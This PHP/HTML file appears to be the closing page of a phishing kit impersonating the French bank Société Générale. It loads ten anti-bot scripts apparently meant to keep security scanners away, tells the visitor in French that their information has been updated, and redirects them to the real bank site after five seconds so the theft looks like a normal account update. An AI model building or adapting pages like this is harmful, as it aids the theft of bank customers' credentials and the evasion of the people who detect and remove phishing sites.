<?php
include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>SG | Mise à jour réussie</title>
  <link rel="stylesheet" href="style.css" />
  <style>
    body, html {
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      background-color: #ffffff;
      height: 100vh;
    }

    .center-wrapper {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      min-height: 100vh;
      padding: 20px;
    }

    .success-icon {
      width: 80px;
      height: 80px;
      margin-bottom: 20px;
    }

    .success-circle {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      background-color: #28a745;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .success-circle::before {
      content: '✔';
      font-size: 40px;
      color: white;
    }

    .success-message {
      font-size: 1.4rem;
      font-weight: 600;
      color: #000000;
      margin-bottom: 10px;
    }

    .redirect-message {
      font-size: 1rem;
      color: #555555;
    }
  </style>
</head>
<body>

  <div class="center-wrapper">
    <div class="success-circle"></div>
    <div class="success-message">
      Vos informations ont bien été mises à jour
    </div>
    <div class="redirect-message">
      Vous allez être redirigé vers la page d'accueil...
    </div>
  </div>

  <script>
    setTimeout(() => {
      window.location.href = "https://www.societegenerale.fr"; // À modifier si besoin
    }, 5000);
  </script>

</body>
</html>
